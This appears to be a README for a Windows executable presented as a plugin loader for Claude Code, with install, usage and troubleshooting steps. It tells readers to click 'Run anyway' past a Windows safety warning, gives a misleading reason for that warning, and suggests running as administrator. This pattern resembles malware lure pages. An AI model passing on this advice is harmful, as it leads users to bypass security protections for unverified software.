## What is this tool?
This software organizes plugins for Claude Code. It helps you find tools, connect them to your existing setup, and install them safely. You use this tool to manage your plugin library without writing code or manually moving files.

## 💻 System requirements
- Windows 10 or Windows 11
- An active internet connection 
- Claude Code installed on your system
- At least 100MB of free disk space

Follow these steps to set up the software on your Windows computer:

1. Click the download link provided above.
2. Select the file ending in .exe from the latest release list.
3. Save the file to your computer.
4. Locate the file in your Downloads folder.
5. Double-click the file to start the installer.
6. Follow the instructions on the screen.
7. Click Finish to complete the process.

If Windows shows a generic safety warning, click "More info" and then click "Run anyway." This happens because we provide updates frequently.

## 🚀 How to use the loader
Open the application from your desktop or start menu. The program opens a dashboard showing available plugins. 

1. **Browse categories:** View different plugins available for Claude Code.
2. **Select a plugin:** Click on a plugin name to see what it does.
3. **Install:** Click the Install button. The loader handles the file placement for you.
4. **Connect marketplace:** Use the settings menu to link your account if you use a specific marketplace provider.
5. **Update:** The loader notifies you when a plugin has a newer version. Click Update to apply the changes.

## 🛡️ Managing plugins
The tool uses a release-oriented workflow. This means it tracks the official versions released by developers. You do not need to worry about complex configurations. The software configures your paths automatically so Claude Code recognizes the new tools instantly.

If you want to remove a plugin, navigate to your "Installed" tab. Select the plugin you want to remove and click Uninstall. The software cleans up the temporary files and removes the reference from your Claude Code configuration.

## 🔍 Troubleshooting common issues
If the software does not behave as expected, try these simple steps:

- **Missing connection:** Restart both the Claude Code application and the loader.
- **Permission errors:** Run the application as an administrator. Right-click the icon and select "Run as administrator."
- **Blank dashboard:** Check your internet connection. The loader needs a connection to refresh the list of available plugins.
- **Update failure:** If a plugin refuses to install, uninstall the current version first, then try the installation again.

## 📈 Keeping the software current
We release improvements often. Open the loader once a week to check for internal updates. The loader displays a notification icon when a patch exists. Click the notification to download the installer again and run it over your existing version. Your settings remain saved during this process.

## 📝 Configuration options
The settings menu allows you to change how the loader looks and behaves. You can toggle dark mode, change where tools install, and modify connection settings for different marketplaces. Do not change the file path settings unless you understand where Claude Code stores its own internal files. Changing these paths without reason might cause the loader to lose connection with your plugins.
